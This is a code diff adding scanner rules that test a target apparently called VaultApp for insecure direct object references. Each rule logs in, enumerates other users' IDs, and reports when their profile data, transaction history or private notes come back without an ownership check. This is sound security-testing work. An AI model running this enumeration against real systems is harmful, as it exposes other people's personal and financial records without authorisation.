@@ -65580,6 +65580,230 @@ const vaultappAdminUsersDeleteRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function probeVaultappUsersIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  const victimIds = [15, 20, 25, 50, 100, auth.userId === 299 ? 10 : 299];
+  for (const victimId of victimIds) {
+    if (victimId === auth.userId) continue;
+    const userUrl = new URL(`/api/users/${victimId}`, ctx.origin).toString();
+    const doc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as {
+        id?: number;
+        username?: string;
+        email?: string;
+        account_number?: string;
+        ssn_last4?: string;
+      };
+      if (!data.id || !data.username || !data.email || data.username === auth.username) continue;
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          userUrl,
+          caller: auth.username,
+          victimId: data.id,
+          victimUsername: data.username,
+          victimEmail: data.email,
+          victimAccount: data.account_number,
+          snippet: doc.body.slice(0, 280).trim(),
+          note: `VaultApp GET /api/users/${data.id} returns ${data.username} PII (email, phone, balance) to authenticated ${auth.username} without ownership check — user-profile IDOR oracle`
+        }
+      };
+    } catch {
+      /* try next id */
+    }
+  }
+  return null;
+}
+
+const vaultappUsersIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappUsersIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappUsersIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/users\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappUsersIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/users/:id route scan — GET returns another user's profile PII without ownership check — user-profile IDOR oracle"
+    }
+  };
+};
+
+async function probeVaultappTransactionsIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  const victimIds = [15, 20, 25, 50, auth.userId === 299 ? 10 : 299];
+  for (const victimId of victimIds) {
+    if (victimId === auth.userId) continue;
+    const userUrl = new URL(`/api/users/${victimId}`, ctx.origin).toString();
+    const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
+    if (userDoc.status < 200 || userDoc.status >= 300) continue;
+    let victimAccount: string | null = null;
+    let victimUsername: string | null = null;
+    try {
+      const user = JSON.parse(userDoc.body) as { account_number?: string; username?: string };
+      victimAccount = user.account_number || null;
+      victimUsername = user.username || null;
+    } catch {
+      continue;
+    }
+    if (!victimAccount || !victimUsername || victimUsername === auth.username) continue;
+    const txUrl = new URL("/api/transactions", ctx.origin);
+    txUrl.searchParams.set("account_id", victimAccount);
+    const txDoc = await ctx.probe.get(txUrl.toString(), {
+      headers,
+      maxBytes: 16384,
+      timeoutMs: 20000
+    });
+    if (txDoc.status < 200 || txDoc.status >= 300) continue;
+    try {
+      const data = JSON.parse(txDoc.body) as {
+        account_id?: string;
+        transactions?: Array<{ id?: number; amount?: string; description?: string }>;
+      };
+      if (data.account_id !== victimAccount || !Array.isArray(data.transactions) || data.transactions.length < 1) {
+        continue;
+      }
+      const sample = data.transactions[0];
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          transactionsUrl: txUrl.toString(),
+          caller: auth.username,
+          victimUsername,
+          victimAccount,
+          transactionCount: data.transactions.length,
+          sampleAmount: sample?.amount,
+          sampleDescription: sample?.description,
+          snippet: txDoc.body.slice(0, 280).trim(),
+          note: `VaultApp GET /api/transactions?account_id=${victimAccount} returns ${victimUsername}'s transaction history to authenticated ${auth.username} without ownership check — transaction-history IDOR oracle`
+        }
+      };
+    } catch {
+      /* try next victim */
+    }
+  }
+  return null;
+}
+
+const vaultappTransactionsIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappTransactionsIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappTransactionsIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/transactions/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappTransactionsIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/transactions route scan — account_id query returns another user's transaction history without ownership check — transaction-history IDOR oracle"
+    }
+  };
+};
+
+async function probeVaultappNotesIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  const noteIdsToTry = [
+    15, 25, 51, 65, 75, 91, 99,
+    ...Array.from({ length: 40 }, (_, i) => i + 1)
+  ];
+  const seenNoteIds = new Set<number>();
+  for (const noteId of noteIdsToTry) {
+    if (seenNoteIds.has(noteId)) continue;
+    seenNoteIds.add(noteId);
+    const noteUrl = new URL(`/api/notes/${noteId}`, ctx.origin).toString();
+    const doc = await ctx.probe.get(noteUrl, { headers, maxBytes: 4096, timeoutMs: 12000 });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as {
+        id?: number;
+        user_id?: number;
+        title?: string;
+        body?: string;
+        is_private?: boolean;
+        owner_username?: string;
+      };
+      if (!data.id || !data.body || !data.owner_username) continue;
+      if (data.owner_username === auth.username || data.user_id === auth.userId) continue;
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          noteUrl,
+          caller: auth.username,
+          noteId: data.id,
+          owner: data.owner_username,
+          title: data.title,
+          isPrivate: data.is_private,
+          snippet: doc.body.slice(0, 280).trim(),
+          note: `VaultApp GET /api/notes/${data.id} returns private note "${data.title}" owned by ${data.owner_username} to authenticated ${auth.username} without ownership check — private-note IDOR oracle`
+        }
+      };
+    } catch {
+      /* try next id */
+    }
+  }
+  return null;
+}
+
+const vaultappNotesIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappNotesIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappNotesIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/notes\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappNotesIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/notes/:id route scan — GET returns another user's private note without ownership check — private-note IDOR oracle"
+    }
+  };
+};
+
 // --- Archon engineering knowledge platform — cybersecurity training path --------------
 const CLIENT_ARCHON_TRAINING_RES: { label: string; re: RegExp }[] = [
   {
@@ -68065,6 +68289,12 @@ export const RULES: Record<string, Rule> = {
   vaultappAccountExportApikeyRouteLiveOracle,
   vaultappAdminUsersDeleteLiveOracle,
   vaultappAdminUsersDeleteRouteLiveOracle,
+  vaultappUsersIdorLiveOracle,
+  vaultappUsersIdorRouteLiveOracle,
+  vaultappTransactionsIdorLiveOracle,
+  vaultappTransactionsIdorRouteLiveOracle,
+  vaultappNotesIdorLiveOracle,
+  vaultappNotesIdorRouteLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
